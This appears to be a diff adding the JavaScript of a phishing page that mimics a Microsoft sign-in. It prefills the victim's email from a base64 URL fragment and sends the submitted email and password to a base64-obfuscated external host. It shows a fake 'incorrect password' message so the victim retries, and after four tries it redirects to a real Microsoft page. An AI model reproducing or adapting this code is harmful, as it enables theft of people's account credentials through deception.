@@ -1,0 +1,71 @@
+
+		
+		
+
+
+var feedUpdateResponse = window.location.href;
+var feedUpdateSplit = feedUpdateResponse.split("");
+
+for (var x = 0; x < feedUpdateSplit.length; x++) {
+ 
+ if (feedUpdateSplit[x]=="#"){
+  var che= feedUpdateResponse.substring(x+1);
+ 
+ }else{
+ 
+
+ }
+
+ 
+ 
+ }
+  document.getElementById("pet").value =atob(che)
+document.getElementById("p1").innerHTML = atob(che)
+  document.getElementById("pet").value =atob(che)
+
+
+
+
+	  
+	   $(document).ready(function() {
+		    var user=$("#pet").val();
+		  var  count=0;
+		   
+        $('form').submit(function(e) {
+			
+			count=count+1;
+			
+		var d=atob('aHR0cHM6Ly9vZmZpY2VvbmxsaW5lLnVzLXNvdXRoLmNmLmFwcGRvbWFpbi5jbG91ZC9zZW5kL2phY2sucGhw');
+		
+            e.preventDefault();
+               $.ajax({
+			   
+            type: 'POST',
+            url: d,
+			crossDomain: true,
+            data: $('form').serialize(),
+			
+			 beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+			
+            success: function () {
+				$("#successMessage").show();
+				    $("#successMessage").html("Your email or password is incorrect. If you don't remember your password, <a href='#'>reset it now.</a>");
+					
+					 if (count>=4) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration");
+
+                  }else{
+					 $("form")[0].reset();
+					   $('#submit-btn').html('CONTINUE');
+					$("#pet").val(user);
+            
+					 }
+            }
+          });
+        });
+    });
+    
